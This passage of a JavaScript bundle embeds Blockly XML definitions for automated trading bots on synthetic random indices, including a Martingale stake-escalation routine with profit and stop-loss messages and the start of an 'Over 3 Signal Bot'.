id=",SlySs_W~FKiP]N=;i)#">\n                                                <field name="VAR" id="^(Gy/YRFAMn6r6Ekap/J" variabletype="">Loss Count</field>\n                                                <value name="VALUE">\n                                                  <block type="math_number" id="`7jfLs/rrTtXkqtu1]H-">\n                                                    <field name="NUM">0</field>\n                                                  </block>\n                                                </value>\n                                                <next>\n                                                  <block type="variables_set" id="Kdxaa:4n8[(u!bAR%ZSN">\n                                                    <field name="VAR" id="/VJ7O.)sAJmm47`,|W=v" variabletype="">Loss Level</field>\n                                                    <value name="VALUE">\n                                                      <block type="math_number" id="i8eQe8XUo$cT`.gE,$f,">\n                                                        <field name="NUM">0</field>\n                                                      </block>\n                                                    </value>\n                                                  </block>\n                                                </next>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_callnoreturn" id="_)fv$gzfiKs^|?~K?y1T" disabled="true" x="256" y="856">\n    <mutation name="Daily Profit\'s System">\n      <arg name="Target Profit"></arg>\n      <arg name="Stop Loss"></arg>\n      <arg name="First Stake"></arg>\n      <arg name="Martingale Factor"></arg>\n      <arg name="Martingale Level"></arg>\n      <arg name="Do Martingale After"></arg>\n    </mutation>\n    <data>0K~#d=SgPPum#y256eqo</data>\n    <value name="ARG0">\n      <block type="math_number" id="UTMPVo8W#j%Y|/hA;K9+">\n        <field name="NUM">10</field>\n      </block>\n    </value>\n    <value name="ARG1">\n      <block type="math_number" id="XM0`QlqdBSq$^,JfY]*8">\n        <field name="NUM">100</field>\n      </block>\n    </value>\n    <value name="ARG2">\n      <block type="math_number" id="(c/(aDWgzv0f|tZk|^nU">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG3">\n      <block type="math_number" id="iu92~b@%7*Z:mG-|#Y5J">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG4">\n      <block type="math_number" id="5/)lJ7-7vQS?4+B!p=~.">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n    <value name="ARG5">\n      <block type="math_number" id="SA*?-HHmd]ieair?USGa">\n        <field name="NUM">1</field>\n      </block>\n    </value>\n  </block>\n  <block type="procedures_defreturn" id="uCU|lbwtbn|QJ4.@K`_=" collapsed="true" x="0" y="880">\n    <mutation>\n      <arg name="[Win Result]" varid="BPsrb}:o?nCP7t]1@Rfq"></arg>\n      <arg name="Detail Profit" varid="dK=o~;7~9dr8wCZ%hyh,"></arg>\n    </mutation>\n    <field name="NAME">Daily Profit\'s Trade Again</field>\n    <comment id="S=,O2IZR(^?)$(k`,Ys!" pinned="true" h="200" w="200" x="0" y="880" minimized="true">FRUITFELLA\'s Management ver. 3.0</comment>\n    <statement name="STACK">\n      <block type="math_change" id="nsSpz1d}6`C?g#KF*i;T">\n        <field name="VAR" id="ddH0?/^#_8u1VjM/!`t|" variabletype="">Profit</field>\n        <value name="DELTA">\n          <shadow type="math_number" id="reI]r?1ms(?@I,.XC;hw">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="K.[XVE{Z*fI!DS$,;sRH">\n            <field name="VAR" id="dK=o~;7~9dr8wCZ%hyh," variabletype="">Detail Profit</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="|lc.j(X_=[~9_^@[H{[5">\n            <field name="VAR" id="ddH0?/^#_8u1VjM/!`t|" variabletype="">Profit</field>\n            <value name="VALUE">\n              <block type="math_arithmetic" id="@UjAMHv#CC)jgg9lc+qK">\n                <field name="OP">DIVIDE</field>\n                <value name="A">\n                  <shadow type="math_number" id=";t/g|EfT,?[?}]V3]F|u">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="math_round" id="T8e-NTr#M%Sv}NSJ[At1">\n                    <field name="OP">ROUND</field>\n                    <value name="NUM">\n                      <shadow type="math_number" id="IWFr{Xw-L^~Llr~kR6|u">\n                        <field name="NUM">3.1</field>\n                      </shadow>\n                      <block type="math_arithmetic" id="Xd$Q_N(NYoH~7ad1H9_%">\n                        <field name="OP">MULTIPLY</field>\n                        <value name="A">\n                          <shadow type="math_number" id="8toB7rmtYAar#-hsE?2q">\n                            <field name="NUM">1</field>\n                          </shadow>\n                          <block type="variables_get" id=";hvUde_XV?zCo)txgDL;">\n                            <field name="VAR" id="ddH0?/^#_8u1VjM/!`t|" variabletype="">Profit</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <shadow type="math_number" id="t])Mm|ScOk4|lM)(^c*j">\n                            <field name="NUM">100</field>\n                          </shadow>\n                        </value>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <value name="B">\n                  <shadow type="math_number" id="0OKvzRcW9[+agawlEW+#">\n                    <field name="NUM">100</field>\n                  </shadow>\n                </value>\n              </block>\n            </value>\n            <next>\n              <block type="controls_if" id="O=DQQnVP8gBv|dLFvGXj">\n                <mutation else="1"></mutation>\n                <value name="IF0">\n                  <block type="variables_get" id="9eXld_JB5^M7T@Z?AW/{">\n                    <field name="VAR" id="BPsrb}:o?nCP7t]1@Rfq" variabletype="">[Win Result]</field>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="math_change" id="T#[;YR8(1-tdMdO:=ms$">\n                    <field name="VAR" id="RRH]M7%0M)Zi;ridyo7}" variabletype="">Win Count</field>\n                    <value name="DELTA">\n                      <shadow type="math_number" id="ya1P[{VT8h0mwo+$xbQk">\n                        <field name="NUM">1</field>\n                      </shadow>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="M:l,;HqVMey=%Z)qiclx">\n                        <field name="VAR" id="^(Gy/YRFAMn6r6Ekap/J" variabletype="">Loss Count</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="QT1$dj(:m+((z@2(+hpk">\n                            <field name="NUM">0</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="YCrtm_cnw%#oFm=4Ez!+">\n                            <field name="VAR" id="RMbK)by1LEnp^9@HKC(*" variabletype="">Stake</field>\n                            <value name="VALUE">\n                              <block type="variables_get" id="9!7ua;$_a`oLX_av]_}t">\n                                <field name="VAR" id="k:EcRUy)u-26FkWUoszO" variabletype="">FirstStake</field>\n                              </block>\n                            </value>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="math_change" id="{#;ZOaGw]`B2+6Edck/l">\n                    <field name="VAR" id="^(Gy/YRFAMn6r6Ekap/J" variabletype="">Loss Count</field>\n                    <value name="DELTA">\n                      <shadow type="math_number" id=",3GsU*UFMTaX#(=UT8R=">\n                        <field name="NUM">1</field>\n                      </shadow>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="(p25n^*J+XTDN,ZHZZ+y">\n                        <field name="VAR" id="RRH]M7%0M)Zi;ridyo7}" variabletype="">Win Count</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="~Y*FHJ(gr1Kw+Vx-(.HO">\n                            <field name="NUM">0</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="controls_if" id="}g@5*e@BKR?]MB2P[H*d">\n                            <value name="IF0">\n                              <block type="logic_compare" id="}{O%!/v.Fl,AYJ^fqT|_">\n                                <field name="OP">GT</field>\n                                <value name="A">\n                                  <block type="variables_get" id="~]Cnb$h%@n4`g_o=%6df">\n                                    <field name="VAR" id="^(Gy/YRFAMn6r6Ekap/J" variabletype="">Loss Count</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="variables_get" id="xY)Dwi,;o[4Knht[uniT">\n                                    <field name="VAR" id="/VJ7O.)sAJmm47`,|W=v" variabletype="">Loss Level</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="pU~Y$nYy4e^?6tbg6zqO">\n                                <field name="VAR" id="/VJ7O.)sAJmm47`,|W=v" variabletype="">Loss Level</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="nnFWoKv#:jtD`D27gWXI">\n                                    <field name="VAR" id="^(Gy/YRFAMn6r6Ekap/J" variabletype="">Loss Count</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                            <next>\n                              <block type="controls_if" id="$U}C3+AXyXynrB92p$RN">\n                                <value name="IF0">\n                                  <block type="logic_compare" id="youe]Px$A9J-AOs4:y$z">\n                                    <field name="OP">GT</field>\n                                    <value name="A">\n                                      <block type="variables_get" id="{?LD`mxw~r^F#WA=7#~l">\n                                        <field name="VAR" id="[~%IWPApAWAU4`63rDfr" variabletype="">MartiLossLevel</field>\n                                      </block>\n                                    </value>\n                                    <value name="B">\n                                      <block type="math_number" id="*2{PewA/^,iX/EXKI8AS">\n                                        <field name="NUM">0</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </value>\n                                <statement name="DO0">\n                                  <block type="controls_if" id="as`8$@ht/X{tBl9Zy/@I">\n                                    <value name="IF0">\n                                      <block type="logic_operation" id="S9I3g.lg,Bp93Sqd.6=0">\n                                        <field name="OP">AND</field>\n                                        <value name="A">\n                                          <block type="logic_compare" id="CRe$fCI6xM:.XV21Xm+`">\n                                            <field name="OP">GT</field>\n                                            <value name="A">\n                                              <block type="variables_get" id=",OHNyu(w@;GbC)=;a5lg">\n                                                <field name="VAR" id="Nxx}Lsm5Mjf|D~2!Dj%V" variabletype="">MartiStart</field>\n                                              </block>\n                                            </value>\n                                            <value name="B">\n                                              <block type="math_number" id="@?eC4XytYU]ly,Cx@ce^">\n                                                <field name="NUM">0</field>\n                                              </block>\n                                            </value>\n                                          </block>\n                                        </value>\n                                        <value name="B">\n                                          <block type="logic_compare" id="[|`pB`,m2c8cu|m8K[Zx">\n                                            <field name="OP">GTE</field>\n                                            <value name="A">\n                                              <block type="variables_get" id="S9%owD)B;6*ME5,YsvM!">\n                                                <field name="VAR" id="^(Gy/YRFAMn6r6Ekap/J" variabletype="">Loss Count</field>\n                                              </block>\n                                            </value>\n                                            <value name="B">\n                                              <block type="variables_get" id="oO9x-E~hxHS;cW,fZh^Z">\n                                                <field name="VAR" id="Nxx}Lsm5Mjf|D~2!Dj%V" variabletype="">MartiStart</field>\n                                              </block>\n                                            </value>\n                                          </block>\n                                        </value>\n                                      </block>\n                                    </value>\n                                    <statement name="DO0">\n                                      <block type="controls_if" id="bVLEad]-_{LmYqdSej/j">\n                                        <mutation else="1"></mutation>\n                                        <value name="IF0">\n                                          <block type="logic_compare" id="N2rKz3EtM|DV=rW7IQh`">\n                                            <field name="OP">LTE</field>\n                                            <value name="A">\n                                              <block type="variables_get" id="OxyLIO)?zrg:Le3/d*H5">\n                                                <field name="VAR" id="^(Gy/YRFAMn6r6Ekap/J" variabletype="">Loss Count</field>\n                                              </block>\n                                            </value>\n                                            <value name="B">\n                                              <block type="variables_get" id="zqk])^Tmt#FB)N.ugo9:">\n                                                <field name="VAR" id="[~%IWPApAWAU4`63rDfr" variabletype="">MartiLossLevel</field>\n                                              </block>\n                                            </value>\n                                          </block>\n                                        </value>\n                                        <statement name="DO0">\n                                          <block type="math_change" id="=:E2O@F^6dyIFbtt`~kk">\n                                            <field name="VAR" id="RMbK)by1LEnp^9@HKC(*" variabletype="">Stake</field>\n                                            <value name="DELTA">\n                                              <shadow type="math_number" id="oDLA4YlAg6/,u/SzdIzY">\n                                                <field name="NUM">1</field>\n                                              </shadow>\n                                              <block type="math_arithmetic" id="+{gxoI6sR7a%-9HmwpO1">\n                                                <field name="OP">MULTIPLY</field>\n                                                <value name="A">\n                                                  <shadow type="math_number" id="3voNIb}X6d}k7zz.0fy7">\n                                                    <field name="NUM">1</field>\n                                                  </shadow>\n                                                  <block type="variables_get" id="l#*%ZS3MtX$x]UCLB@ts">\n                                                    <field name="VAR" id="RMbK)by1LEnp^9@HKC(*" variabletype="">Stake</field>\n                                                  </block>\n                                                </value>\n                                                <value name="B">\n                                                  <shadow type="math_number" id="kAK_=c-ncS,wXb.FUgW@">\n                                                    <field name="NUM">1</field>\n                                                  </shadow>\n                                                  <block type="variables_get" id="g8x[7)so3Y+Fd}w@d@+M">\n                                                    <field name="VAR" id="ezm;s,8YY7`S_pxNx+{s" variabletype="">MartiFactor</field>\n                                                  </block>\n                                                </value>\n                                              </block>\n                                            </value>\n                                          </block>\n                                        </statement>\n                                        <statement name="ELSE">\n                                          <block type="notify" id="s[DTZ@8i2D$0?a$(hFod">\n                                            <field name="NOTIFICATION_TYPE">info</field>\n                                            <field name="NOTIFICATION_SOUND">silent</field>\n                                            <value name="MESSAGE">\n                                              <block type="text" id="V5v-X8JC_`1aRCPReyzF">\n                                                <field name="TEXT">Martingale Reset</field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="variables_set" id="8HxZjC9WEAGNHMg]yi7f">\n                                                <field name="VAR" id="RMbK)by1LEnp^9@HKC(*" variabletype="">Stake</field>\n                                                <value name="VALUE">\n                                                  <block type="variables_get" id="Z7A+^F6lP0#o%qf/DF`H">\n                                                    <field name="VAR" id="k:EcRUy)u-26FkWUoszO" variabletype="">FirstStake</field>\n                                                  </block>\n                                                </value>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </statement>\n                                      </block>\n                                    </statement>\n                                  </block>\n                                </statement>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <next>\n                  <block type="variables_set" id="W`0|]l{}}wjRJG2;Pkuw">\n                    <field name="VAR" id="#S5]i9_E6vE_6t^_dYeJ" variabletype="">Continue</field>\n                    <value name="VALUE">\n                      <block type="logic_boolean" id="aP8jWr2DY?*{q%F6*-0[">\n                        <field name="BOOL">FALSE</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="controls_if" id="Db{x9!UEyeKc!klE;GN1">\n                        <mutation elseif="1" else="1"></mutation>\n                        <value name="IF0">\n                          <block type="logic_compare" id="PVu4{8f?FcLFj!/CVzzi">\n                            <field name="OP">GTE</field>\n                            <value name="A">\n                              <block type="variables_get" id="2_}pOO~hkVo^S-(D{oC7">\n                                <field name="VAR" id="ddH0?/^#_8u1VjM/!`t|" variabletype="">Profit</field>\n                              </block>\n                            </value>\n                            <value name="B">\n                              <block type="variables_get" id="fLhJZ4krxL_lEco[HsqM">\n                                <field name="VAR" id="!c%d*XBHYNv0h]4+]*nj" variabletype="">TargetProfit</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                        <statement name="DO0">\n                          <block type="text_join" id="YuzaK[q_-67xw4U00nUD">\n                            <field name="VARIABLE" id="0+2#g0Tyh=0b=a(l6T@n" variabletype="">text</field>\n                            <statement name="STACK">\n                              <block type="text_statement" id="d|ouKt#OFtc9P2W#0!VC">\n                                <value name="TEXT">\n                                  <shadow type="text" id="UL%-Snmz{0tRf^|dQel|">\n                                    <field name="TEXT"></field>\n                                  </shadow>\n                                  <block type="text" id="406(z$5zPp1nu:`,cdXs">\n                                    <field name="TEXT">CONGRATULATION! Target Profit has been reached! Take Profit $</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="text_statement" id="t+6g?J]?Ij?R+KpFu.K(">\n                                    <value name="TEXT">\n                                      <shadow type="text" id="BP)+fp#ZuiM,Dei~emce">\n                                        <field name="TEXT"></field>\n                                      </shadow>\n                                      <block type="variables_get" id="k|rFG2,%PuwfJ{)FL!|P">\n                                        <field name="VAR" id="ddH0?/^#_8u1VjM/!`t|" variabletype="">Profit</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </statement>\n                            <next>\n                              <block type="text_print" id=":t6k#)IL`S7WWl}GqgJJ">\n                                <value name="TEXT">\n                                  <shadow type="text" id="~1{SUvJ`GDbGWTc,Cws!">\n                                    <field name="TEXT">abc</field>\n                                  </shadow>\n                                  <block type="variables_get" id="J0mg(k79U$JnrgMu~P}r">\n                                    <field name="VAR" id="0+2#g0Tyh=0b=a(l6T@n" variabletype="">text</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </next>\n                          </block>\n                        </statement>\n                        <value name="IF1">\n                          <block type="logic_compare" id="CZt*0?/c`b+i]J[r{zF$">\n                            <field name="OP">LTE</field>\n                            <value name="A">\n                              <block type="variables_get" id="]-LmO6c#?Rbr8T%RE=$t">\n                                <field name="VAR" id="ddH0?/^#_8u1VjM/!`t|" variabletype="">Profit</field>\n                              </block>\n                            </value>\n                            <value name="B">\n                              <block type="variables_get" id="8YwNfnEy,|;s_!SqI-L:">\n                                <field name="VAR" id="m(@~SI$PI9_=9gVd*zl9" variabletype="">Stoploss</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                        <statement name="DO1">\n                          <block type="text_join" id="Njlh9?Z,UDQI1@hkibKS">\n                            <field name="VARIABLE" id="JIZO[e-A^9:9$zy?Kuw-" variabletype="">text1</field>\n                            <statement name="STACK">\n                              <block type="text_statement" id="_q,XlXByf%#uY(K|z+90">\n                                <value name="TEXT">\n                                  <shadow type="text" id="K#u$VcO{DDV%=-,8ik@l">\n                                    <field name="TEXT"></field>\n                                  </shadow>\n                                  <block type="text" id="nS$H!F+w0#wRoUmpCx~$">\n                                    <field name="TEXT">UPSSS! You\'ve Reached Stop Loss $</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="text_statement" id="F9]4=ACP~oWl.h0h0)Ar">\n                                    <value name="TEXT">\n                                      <shadow type="text" id="*{AJ|sA3HWVS#0[P#IhW">\n                                        <field name="TEXT"></field>\n                                      </shadow>\n                                      <block type="variables_get" id="Kq44Vz}]5T@h3=UBSYS8">\n                                        <field name="VAR" id="ddH0?/^#_8u1VjM/!`t|" variabletype="">Profit</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </statement>\n                            <next>\n                              <block type="text_print" id="c)xSG}K/F6/xT/=6w{+e">\n                                <value name="TEXT">\n                                  <shadow type="text" id="Bw,)X7~-F:8umt,##hx1">\n                                    <field name="TEXT">abc</field>\n                                  </shadow>\n                                  <block type="variables_get" id="gk+l(G7*GZP`%ROOcW!`">\n                                    <field name="VAR" id="JIZO[e-A^9:9$zy?Kuw-" variabletype="">text1</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </next>\n                          </block>\n                        </statement>\n                        <statement name="ELSE">\n                          <block type="controls_if" id="Jq%qIdO;i8t(k7GNS@^f">\n                            <mutation else="1"></mutation>\n                            <value name="IF0">\n                              <block type="logic_compare" id="Y?M%RF2_[4+,Oww1b=rV">\n                                <field name="OP">GT</field>\n                                <value name="A">\n                                  <block type="variables_get" id="_JLF@e+qt+^o.pwZM;64">\n                                    <field name="VAR" id="ddH0?/^#_8u1VjM/!`t|" variabletype="">Profit</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id=")EP?3X7VNz5*su;`FJ1H">\n                                    <field name="NUM">0</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="text_join" id="T(]r!o/v-m^xWn3s%jrx">\n                                <field name="VARIABLE" id="umJ^/{8q8p55:]m_8J^^" variabletype="">text2</field>\n                                <statement name="STACK">\n                                  <block type="text_statement" id="nCgXrAB:mPOq1mWE9OY%">\n                                    <value name="TEXT">\n                                      <shadow type="text" id="@i2awB^8Ax.f{zO)@|~E">\n                                        <field name="TEXT"></field>\n                                      </shadow>\n                                      <block type="text" id="ung[-]-L)]p6PBn;9;Vf">\n                                        <field name="TEXT">Total profit $ </field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="text_statement" id="MT]w1]vyUqDQ_P2}6TGF">\n                                        <value name="TEXT">\n                                          <shadow type="text" id="vLWyxHrVCLm8`Je/1Tw1">\n                                            <field name="TEXT"></field>\n                                          </shadow>\n                                          <block type="variables_get" id="%7U9P$0Uj=LnyZf7mkXb">\n                                            <field name="VAR" id="ddH0?/^#_8u1VjM/!`t|" variabletype="">Profit</field>\n                                          </block>\n                                        </value>\n                                        <next>\n                                          <block type="text_statement" id="=nJ=,h;-XIV.^SPWkLv~">\n                                            <value name="TEXT">\n                                              <shadow type="text" id="qog0g=l9|Gl}z!EpB5A]">\n                                                <field name="TEXT"></field>\n                                              </shadow>\n                                              <block type="text" id="j8(4%/k=C23%r[16ee`0">\n                                                <field name="TEXT"> || Loss Level </field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="text_statement" id="3QKi_)u^WfTjm`ecIuGL">\n                                                <value name="TEXT">\n                                                  <shadow type="text" id="yO_yMF6]yKNUE1uRg;nP">\n                                                    <field name="TEXT"></field>\n                                                  </shadow>\n                                                  <block type="variables_get" id="Hu9+=BS?SiJ/}}inaFuZ">\n                                                    <field name="VAR" id="/VJ7O.)sAJmm47`,|W=v" variabletype="">Loss Level</field>\n                                                  </block>\n                                                </value>\n                                                <next>\n                                                  <block type="text_statement" id="w3m3iA,aQ,@6KFw],WFI">\n                                                    <value name="TEXT">\n                                                      <shadow type="text" id="b`P7fiknM5$^[lG6c7]@">\n                                                        <field name="TEXT"></field>\n                                                      </shadow>\n                                                      <block type="text" id="a%p/eDl5!#)![kThB3US">\n                                                        <field name="TEXT"> || Loss Count </field>\n                                                      </block>\n                                                    </value>\n                                                    <next>\n                                                      <block type="text_statement" id="1,wbRnZLrvHZIgY.7bwG">\n                                                        <value name="TEXT">\n                                                          <shadow type="text" id="^vYY.H@+rQ]{`8iV[L/y">\n                                                            <field name="TEXT"></field>\n                                                          </shadow>\n                                                          <block type="variables_get" id="JQj/snLjq8VJi9d}IHuU">\n                                                            <field name="VAR" id="^(Gy/YRFAMn6r6Ekap/J" variabletype="">Loss Count</field>\n                                                          </block>\n                                                        </value>\n                                                      </block>\n                                                    </next>\n                                                  </block>\n                                                </next>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </statement>\n                                <next>\n                                  <block type="notify" id="_O];l_irl^GO,~2#5cr6">\n                                    <field name="NOTIFICATION_TYPE">success</field>\n                                    <field name="NOTIFICATION_SOUND">silent</field>\n                                    <value name="MESSAGE">\n                                      <block type="variables_get" id="A.c`t![-9ddX~x3=iOKK">\n                                        <field name="VAR" id="umJ^/{8q8p55:]m_8J^^" variabletype="">text2</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </statement>\n                            <statement name="ELSE">\n                              <block type="text_join" id="kVjn?.([F}sgtt04|~wZ">\n                                <field name="VARIABLE" id=":A(nDZDt5~/IS:5Q7?jx" variabletype="">text3</field>\n                                <statement name="STACK">\n                                  <block type="text_statement" id="_9wt3^H}q[-,*~AsESn%">\n                                    <value name="TEXT">\n                                      <shadow type="text" id="T38Uovs=nW1_XpxWXa7P">\n                                        <field name="TEXT"></field>\n                                      </shadow>\n                                      <block type="text" id="S}QT3a?5-Cxevg*Pc+~K">\n                                        <field name="TEXT">Total Loss $ </field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="text_statement" id="qHyz5Q23-9Ep)0k2d1+O">\n                                        <value name="TEXT">\n                                          <shadow type="text" id="My-l`]#2+n%G8*:zWW-w">\n                                            <field name="TEXT"></field>\n                                          </shadow>\n                                          <block type="variables_get" id="hRZoud?QgJTpd87$0eEf">\n                                            <field name="VAR" id="ddH0?/^#_8u1VjM/!`t|" variabletype="">Profit</field>\n                                          </block>\n                                        </value>\n                                        <next>\n                                          <block type="text_statement" id="OS#yGqvcF:$hw^-;cQ8v">\n                                            <value name="TEXT">\n                                              <shadow type="text" id="!U3s,=~K[(Pk}%UR2plW">\n                                                <field name="TEXT"></field>\n                                              </shadow>\n                                              <block type="text" id="Yu^|KZs]sO%qzu%nQv*-">\n                                                <field name="TEXT"> || Loss Level </field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="text_statement" id="cl*Xn^^W(JW[r5Lzu0+f">\n                                                <value name="TEXT">\n                                                  <shadow type="text" id="5$=hpiL=Za!e?[fyYOtQ">\n                                                    <field name="TEXT"></field>\n                                                  </shadow>\n                                                  <block type="variables_get" id="{cyf:6Zam2K3Vq%)hri:">\n                                                    <field name="VAR" id="/VJ7O.)sAJmm47`,|W=v" variabletype="">Loss Level</field>\n                                                  </block>\n                                                </value>\n                                                <next>\n                                                  <block type="text_statement" id="?.|1?Wemfwd=`lDNGkD#">\n                                                    <value name="TEXT">\n                                                      <shadow type="text" id="sIze,jD%ou*KJ^8a]oeA">\n                                                        <field name="TEXT"></field>\n                                                      </shadow>\n                                                      <block type="text" id="dZ9.$QH%zDh:mZ:P/3R@">\n                                                        <field name="TEXT"> || Loss Count </field>\n                                                      </block>\n                                                    </value>\n                                                    <next>\n                                                      <block type="text_statement" id="Ek`3R:w$0G3ZoBybNBzt">\n                                                        <value name="TEXT">\n                                                          <shadow type="text" id="zqEvM@;?oNq;$d3b0,F_">\n                                                            <field name="TEXT"></field>\n                                                          </shadow>\n                                                          <block type="variables_get" id="1RKj{]?3?HsVMXV+HJKA">\n                                                            <field name="VAR" id="^(Gy/YRFAMn6r6Ekap/J" variabletype="">Loss Count</field>\n                                                          </block>\n                                                        </value>\n                                                      </block>\n                                                    </next>\n                                                  </block>\n                                                </next>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </statement>\n                                <next>\n                                  <block type="notify" id="e[~;rwdV`hP?J=z![5O/">\n                                    <field name="NOTIFICATION_TYPE">error</field>\n                                    <field name="NOTIFICATION_SOUND">silent</field>\n                                    <value name="MESSAGE">\n                                      <block type="variables_get" id="+*n|[,_=rg!}QF}+H(w4">\n                                        <field name="VAR" id=":A(nDZDt5~/IS:5Q7?jx" variabletype="">text3</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </statement>\n                            <next>\n                              <block type="variables_set" id="%qw+JLY*|IGd/`R654Ua">\n                                <field name="VAR" id="#S5]i9_E6vE_6t^_dYeJ" variabletype="">Continue</field>\n                                <value name="VALUE">\n                                  <block type="logic_boolean" id="1x?kZO$I7V#[*xAj|^5[">\n                                    <field name="BOOL">TRUE</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </next>\n                          </block>\n                        </statement>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <value name="RETURN">\n      <block type="variables_get" id="~J)/(,)jN{jYHP,:,1nJ">\n        <field name="VAR" id="#S5]i9_E6vE_6t^_dYeJ" variabletype="">Continue</field>\n      </block>\n    </value>\n  </block>\n</xml>'
            },
            93801: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="https://developers.google.com/blockly/xml" is_dbot="true" collection="false">\n  <variables>\n    <variable id=":o#E4Mv[vmJES2fN=qo0">Prediction</variable>\n    <variable id="]_MS:$MrQakFy~dy[v}a">Text2</variable>\n    <variable id="7Q4y$nr_sr!x2NkOu%)2">Stake</variable>\n    <variable id="K`h}~iKgn?Z)RHYaKFfT">Over Prediction</variable>\n    <variable id="HyNhO~!rk1(6_u;tk|_i">Trade Direction</variable>\n    <variable id="E~[s.X5egS+P$^H_o#nk">Entry Point</variable>\n    <variable id=":Z8WvPXWG?qCe|8=iii1">Expected Profit</variable>\n    <variable id="V3`ByiTyoj~_e_hJc;X=">Stake1</variable>\n    <variable id="L.cN$B-UUzkS|eDQm2xZ">Stop Loss</variable>\n    <variable id="=[Z~Xr60)Z7,Gh`bAzuF">Notify</variable>\n    <variable id="uIhzq(Rnu7?ay*)Lax`q">Loss</variable>\n    <variable id="@GRV-f=US~_%4pd.i}2Q">Recovery Prediction</variable>\n    <variable id="o#PtO)-%Wvm_=AQvH38N">Martingale</variable>\n  </variables>\n  <block type="trade_definition" id="Trl.sJ3}+U,c~e-zFUy^" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="~=oeIoZ%WS/q]1NWBf;P" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">R_100</field>\n        <next>\n          <block type="trade_definition_tradetype" id="uT06=pes~zdz4ppk!7al" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="+:36ts]!!))@0zb2Cw?}" deletable="false" movable="false">\n                <field name="TYPE_LIST">both</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="`-._(9_zhwbfP0b9+,d}" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="`/R47tY(;Ez%$vb[n+%*" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="wlGGC5P.p*4$V[]BL[iS" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="notify" id="EtVT(5w+bQ5K1~?lgY)H">\n        <field name="NOTIFICATION_TYPE">info</field>\n        <field name="NOTIFICATION_SOUND">announcement</field>\n        <value name="MESSAGE">\n          <shadow type="text" id="y45$(A//70MNMEok3mc1">\n            <field name="TEXT">abc</field>\n          </shadow>\n          <block type="text" id="z,gmVY/n$(E|C#^Y}q1;">\n            <field name="TEXT">Over 3 Signal Bot</field>\n          </block>\n        </value>\n    